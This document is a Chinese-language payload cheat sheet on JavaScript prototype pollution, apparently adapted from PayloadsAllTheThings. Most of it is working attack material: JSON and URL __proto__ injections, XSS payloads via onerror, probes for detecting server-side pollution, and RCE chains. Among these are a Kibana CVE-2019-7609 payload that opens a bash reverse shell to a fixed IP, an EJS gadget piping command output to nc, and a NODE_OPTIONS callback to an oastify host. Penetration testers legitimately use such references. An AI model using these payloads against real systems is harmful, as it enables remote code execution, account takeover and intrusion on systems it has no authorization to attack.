# Prototype Pollution - 原型污染

[SEARCH_KEYWORDS]
漏洞类型: Prototype Pollution 原型污染 JavaScript Prototype Pollution
攻击类型: RCE Remote Code Execution XSS Denial of Service Privilege Escalation
关键词: __proto__ prototype constructor Object.prototype inherit
环境: Node.js Client-Side Server-Side JavaScript
技术: JSON Injection URL Injection Gadget Chain

[CONTENT]

## 原型污染概述

原型污染是JavaScript中修改Object.prototype属性时发生的漏洞。JavaScript对象是动态的，可以随时添加属性。几乎所有JavaScript对象都继承自Object.prototype，这使其成为潜在的攻击向量。

## 原型链理解

```javascript
var myDog = new Dog();

myDog.constructor;        // 指向函数"Dog"
myDog.constructor.prototype; // 指向Dog的类定义
myDog.__proto__;          // 指向Dog的类定义
myDog["__proto__"];       // 同上
```

## 攻击示例

### 配置对象污染

```javascript
// 原始配置
let config = { isAdmin: false };

// 攻击者污染原型
Object.prototype.isAdmin = true;

// 所有对象现在都有isAdmin=true
```

## 漏洞利用

### JSON输入注入

```json
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```

### constructor方式注入

```json
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```

### URL注入

```powershell
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
?__proto__[src]=image&__proto__[onerror]=alert(1)
?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```

## 服务端检测

```javascript
// ExpressJS检测
{ "__proto__":{"parameterLimit":1}}  // + 2个参数
{ "__proto__":{"ignoreQueryPrefix":true}}  // + ??foo=bar
{ "__proto__":{"allowDots":true}}  // + ?foo.bar=baz
{ "__proto__":{"json spaces":" "}}  // 响应格式改变
{ "__proto__":{"status":510}}  // 状态码改变
```

## RCE利用

### Kibana RCE (CVE-2019-7609)

```javascript
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

### EJS Gadgets

```json
{
    "__proto__": {
        "client": 1,
        "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
    }
}
```

### NodeJS异步Payload

```json
{
    "__proto__": {
        "argv0":"node",
        "shell":"node",
        "NODE_OPTIONS":"--inspect=payload\"\".oastify\"\".com"
    }
}
```

## Payload列表

```javascript
Object.__proto__["evilProperty"]="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
x[__proto__][abaeead] = abaeead
__proto__[eedffcb] = eedffcb
?__proto__[test]=test
```

## 影响类型

- **RCE**: 远程代码执行
- **XSS**: 跨站脚本攻击
- **DoS**: 拒绝服务
- **权限绕过**: 认证/授权绕过
- **数据篡改**: 修改应用数据

## 工具

- pp-finder - 原型污染Gadget发现工具
- server-side-prototype-pollution - 服务端Gadgets
- client-side-prototype-pollution - 客户端Gadgets
- PPScan - 客户端原型污染扫描器

## 参考文档

原始来源: PayloadsAllTheThings/Prototype Pollution/README.md